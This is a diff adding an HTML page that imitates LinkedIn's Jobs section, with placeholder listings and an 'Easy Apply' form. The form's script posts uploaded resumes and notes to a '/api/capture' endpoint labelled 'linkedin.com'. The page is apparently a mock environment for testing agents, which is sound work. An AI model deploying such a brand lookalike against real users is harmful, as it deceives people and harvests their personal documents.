@@ -1,0 +1,462 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LinkedIn - Jobs</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #f4f2ee;
+            color: #191919;
+            min-height: 100vh;
+        }
+
+        /* Header */
+        .li-header {
+            background: #fff;
+            border-bottom: 1px solid #e0e0e0;
+            padding: 0 24px;
+            height: 52px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        .li-logo svg { width: 34px; height: 34px; }
+        .li-search {
+            padding: 6px 12px;
+            background: #edf3f8;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            width: 280px;
+            outline: none;
+        }
+        .li-nav { display: flex; gap: 24px; margin-left: auto; }
+        .li-nav a {
+            text-decoration: none;
+            color: #666;
+            font-size: 12px;
+            text-align: center;
+        }
+        .li-nav a.active { color: #191919; font-weight: 600; }
+
+        /* Layout */
+        .jobs-layout {
+            max-width: 1128px;
+            margin: 20px auto;
+            padding: 0 16px;
+        }
+        .jobs-header {
+            margin-bottom: 16px;
+        }
+        .jobs-header h1 { font-size: 24px; font-weight: 600; }
+        .jobs-header p { color: #666; margin-top: 4px; }
+
+        /* Search bar */
+        .jobs-search {
+            background: #fff;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 16px;
+            display: flex;
+            gap: 12px;
+        }
+        .jobs-search input {
+            flex: 1;
+            padding: 10px 16px;
+            border: 1px solid #c0c0c0;
+            border-radius: 4px;
+            font-size: 14px;
+            outline: none;
+        }
+        .jobs-search-btn {
+            padding: 10px 24px;
+            background: #0A66C2;
+            color: #fff;
+            border: none;
+            border-radius: 24px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        .jobs-search-btn:hover { background: #004182; }
+
+        /* Job cards */
+        .job-card {
+            background: #fff;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 12px;
+            transition: box-shadow 0.2s;
+        }
+        .job-card:hover { box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
+        .job-card-header {
+            display: flex;
+            gap: 14px;
+        }
+        .company-logo {
+            width: 56px;
+            height: 56px;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            font-weight: 700;
+            color: #fff;
+            flex-shrink: 0;
+        }
+        .job-info { flex: 1; }
+        .job-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: #0A66C2;
+            cursor: pointer;
+        }
+        .job-title:hover { text-decoration: underline; }
+        .company-name { font-size: 14px; color: #191919; margin-top: 2px; }
+        .job-location { font-size: 13px; color: #666; margin-top: 2px; }
+        .job-meta { font-size: 12px; color: #999; margin-top: 4px; }
+        .job-tags {
+            display: flex;
+            gap: 8px;
+            margin-top: 12px;
+            flex-wrap: wrap;
+        }
+        .job-tag {
+            padding: 4px 12px;
+            background: #edf3f8;
+            border-radius: 12px;
+            font-size: 12px;
+            color: #0A66C2;
+            font-weight: 500;
+        }
+        .easy-apply-btn {
+            padding: 8px 20px;
+            background: #0A66C2;
+            color: #fff;
+            border: none;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 12px;
+        }
+        .easy-apply-btn:hover { background: #004182; }
+        .save-btn {
+            padding: 8px 20px;
+            background: #fff;
+            color: #0A66C2;
+            border: 1px solid #0A66C2;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 12px;
+            margin-left: 8px;
+        }
+
+        /* Apply modal */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.6);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+        .modal-overlay.active { display: flex; }
+        .apply-modal {
+            background: #fff;
+            border-radius: 12px;
+            width: 520px;
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+        .apply-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 20px 24px;
+            border-bottom: 1px solid #e0e0e0;
+        }
+        .apply-header h3 { font-size: 20px; }
+        .apply-close {
+            background: none;
+            border: none;
+            font-size: 24px;
+            cursor: pointer;
+            color: #666;
+        }
+        .apply-body { padding: 20px 24px; }
+        .apply-body label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 6px;
+            margin-top: 16px;
+        }
+        .apply-body label:first-child { margin-top: 0; }
+
+        /* Upload zone */
+        .upload-zone {
+            border: 2px dashed #c0c0c0;
+            border-radius: 8px;
+            padding: 32px 16px;
+            text-align: center;
+            cursor: pointer;
+            transition: border-color 0.2s, background 0.2s;
+        }
+        .upload-zone.dragover { border-color: #0A66C2; background: #edf3f8; }
+        .upload-zone .icon { font-size: 36px; color: #0A66C2; margin-bottom: 8px; }
+        .upload-zone p { color: #666; font-size: 14px; }
+        .upload-zone .browse { color: #0A66C2; font-weight: 600; }
+        .upload-filename {
+            margin-top: 8px;
+            font-size: 13px;
+            color: #0A66C2;
+            font-weight: 500;
+        }
+
+        .apply-footer {
+            padding: 16px 24px;
+            border-top: 1px solid #e0e0e0;
+            display: flex;
+            justify-content: flex-end;
+        }
+        .submit-btn {
+            padding: 10px 24px;
+            background: #0A66C2;
+            color: #fff;
+            border: none;
+            border-radius: 24px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        .submit-btn:hover { background: #004182; }
+
+        .file-input { display: none; }
+        .toast {
+            position: fixed;
+            bottom: 32px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #0A66C2;
+            color: #fff;
+            padding: 10px 24px;
+            border-radius: 8px;
+            font-size: 14px;
+            opacity: 0;
+            transition: opacity 0.3s;
+            pointer-events: none;
+            z-index: 2000;
+        }
+        .toast.show { opacity: 1; }
+    </style>
+</head>
+<body>
+    <div class="li-header">
+        <div class="li-logo">
+            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                <path d="M20.5 2h-17A1.5 1.5 0 002 3.5v17A1.5 1.5 0 003.5 22h17a1.5 1.5 0 001.5-1.5v-17A1.5 1.5 0 0020.5 2zM8 19H5v-9h3zM6.5 8.25A1.75 1.75 0 118.3 6.5a1.78 1.78 0 01-1.8 1.75zM19 19h-3v-4.74c0-1.42-.6-1.93-1.38-1.93A1.74 1.74 0 0013 14.19a.66.66 0 000 .14V19h-3v-9h2.9v1.3a3.11 3.11 0 012.7-1.4c1.55 0 3.36.86 3.36 3.66z" fill="#0A66C2"/>
+            </svg>
+        </div>
+        <input class="li-search" type="text" placeholder="Search jobs">
+        <div class="li-nav">
+            <a href="index.html">Home</a>
+            <a href="#" class="active">Jobs</a>
+        </div>
+    </div>
+
+    <div class="jobs-layout">
+        <div class="jobs-header">
+            <h1>Jobs</h1>
+            <p>Find the right job for you</p>
+        </div>
+
+        <div class="jobs-search">
+            <input type="text" placeholder="Search by title, skill, or company">
+            <input type="text" placeholder="Location">
+            <button class="jobs-search-btn">Search</button>
+        </div>
+
+        <!-- Job listings -->
+        <div class="job-card">
+            <div class="job-card-header">
+                <div class="company-logo" style="background:#0A66C2">AC</div>
+                <div class="job-info">
+                    <div class="job-title">Senior Software Engineer</div>
+                    <div class="company-name">Acme Corp</div>
+                    <div class="job-location">San Francisco, CA (Hybrid)</div>
+                    <div class="job-meta">Posted 2 days ago &middot; 47 applicants</div>
+                </div>
+            </div>
+            <div class="job-tags">
+                <span class="job-tag">Full-time</span>
+                <span class="job-tag">$180K - $250K</span>
+                <span class="job-tag">Python</span>
+                <span class="job-tag">Kubernetes</span>
+            </div>
+            <button class="easy-apply-btn" onclick="openApply('Senior Software Engineer', 'Acme Corp')">Easy Apply</button>
+            <button class="save-btn">Save</button>
+        </div>
+
+        <div class="job-card">
+            <div class="job-card-header">
+                <div class="company-logo" style="background:#e06847">TS</div>
+                <div class="job-info">
+                    <div class="job-title">Product Manager, Platform</div>
+                    <div class="company-name">TechStart Inc</div>
+                    <div class="job-location">New York, NY (Remote)</div>
+                    <div class="job-meta">Posted 5 days ago &middot; 112 applicants</div>
+                </div>
+            </div>
+            <div class="job-tags">
+                <span class="job-tag">Full-time</span>
+                <span class="job-tag">$150K - $200K</span>
+                <span class="job-tag">Product</span>
+            </div>
+            <button class="easy-apply-btn" onclick="openApply('Product Manager, Platform', 'TechStart Inc')">Easy Apply</button>
+            <button class="save-btn">Save</button>
+        </div>
+
+        <div class="job-card">
+            <div class="job-card-header">
+                <div class="company-logo" style="background:#2bac76">BB</div>
+                <div class="job-info">
+                    <div class="job-title">Security Analyst</div>
+                    <div class="company-name">BigBank Ltd</div>
+                    <div class="job-location">Chicago, IL (On-site)</div>
+                    <div class="job-meta">Posted 1 week ago &middot; 89 applicants</div>
+                </div>
+            </div>
+            <div class="job-tags">
+                <span class="job-tag">Full-time</span>
+                <span class="job-tag">$120K - $160K</span>
+                <span class="job-tag">SIEM</span>
+                <span class="job-tag">SOC</span>
+            </div>
+            <button class="save-btn">Save</button>
+        </div>
+    </div>
+
+    <!-- Easy Apply Modal -->
+    <div class="modal-overlay" id="apply-modal">
+        <div class="apply-modal">
+            <div class="apply-header">
+                <h3>Apply to <span id="apply-job-title"></span></h3>
+                <button class="apply-close" onclick="closeApply()">&times;</button>
+            </div>
+            <div class="apply-body">
+                <label>Resume</label>
+                <div class="upload-zone" id="upload-zone" onclick="document.getElementById('resume-input').click()"
+                     ondragover="handleDragOver(event)" ondragleave="handleDragLeave(event)" ondrop="handleDrop(event)">
+                    <div class="icon">&#128196;</div>
+                    <p>Drag and drop your resume here or <span class="browse">browse files</span></p>
+                    <p style="font-size:12px;color:#999;margin-top:4px;">PDF, DOC, or DOCX (max 5MB)</p>
+                </div>
+                <div class="upload-filename" id="upload-filename"></div>
+                <input type="file" id="resume-input" class="file-input" accept=".pdf,.doc,.docx" onchange="handleResumeSelect(this)">
+
+                <label>Additional information (optional)</label>
+                <textarea style="width:100%;min-height:80px;border:1px solid #c0c0c0;border-radius:4px;padding:10px;font-size:14px;font-family:inherit;outline:none;resize:vertical;" id="apply-note" placeholder="Why are you a good fit for this role?"></textarea>
+            </div>
+            <div class="apply-footer">
+                <button class="submit-btn" onclick="submitApplication()">Submit application</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="toast" id="toast"></div>
+
+    <script>
+        var currentJob = '';
+        var currentCompany = '';
+        var resumeFile = null;
+
+        function showToast(text) {
+            var t = document.getElementById('toast');
+            t.textContent = text;
+            t.classList.add('show');
+            setTimeout(function() { t.classList.remove('show'); }, 2500);
+        }
+
+        function openApply(job, company) {
+            currentJob = job;
+            currentCompany = company;
+            document.getElementById('apply-job-title').textContent = job;
+            document.getElementById('upload-filename').textContent = '';
+            document.getElementById('apply-note').value = '';
+            resumeFile = null;
+            document.getElementById('apply-modal').classList.add('active');
+        }
+        function closeApply() {
+            document.getElementById('apply-modal').classList.remove('active');
+        }
+
+        function handleDragOver(e) {
+            e.preventDefault();
+            e.currentTarget.classList.add('dragover');
+        }
+        function handleDragLeave(e) {
+            e.currentTarget.classList.remove('dragover');
+        }
+        function handleDrop(e) {
+            e.preventDefault();
+            e.currentTarget.classList.remove('dragover');
+            if (e.dataTransfer.files.length > 0) {
+                resumeFile = e.dataTransfer.files[0];
+                document.getElementById('upload-filename').textContent = resumeFile.name;
+            }
+        }
+        function handleResumeSelect(input) {
+            if (input.files && input.files[0]) {
+                resumeFile = input.files[0];
+                document.getElementById('upload-filename').textContent = resumeFile.name;
+            }
+            input.value = '';
+        }
+
+        function submitApplication() {
+            if (!resumeFile) {
+                showToast('Please upload your resume');
+                return;
+            }
+
+            var formData = new FormData();
+            formData.append('file', resumeFile);
+            formData.append('site', 'linkedin.com');
+            formData.append('action', 'upload_resume');
+            formData.append('job_title', currentJob);
+            formData.append('company', currentCompany);
+            formData.append('note', document.getElementById('apply-note').value);
+
+            fetch('/api/capture', {
+                method: 'POST',
+                body: formData
+            })
+            .then(function(r) { return r.json(); })
+            .then(function() {
+                showToast('Application submitted');
+                closeApply();
+            })
+            .catch(function(err) {
+                console.error('Submit failed:', err);
+            });
+        }
+
+        document.getElementById('apply-modal').addEventListener('click', function(e) {
+            if (e.target === this) closeApply();
+        });
+    </script>
+</body>
+</html>
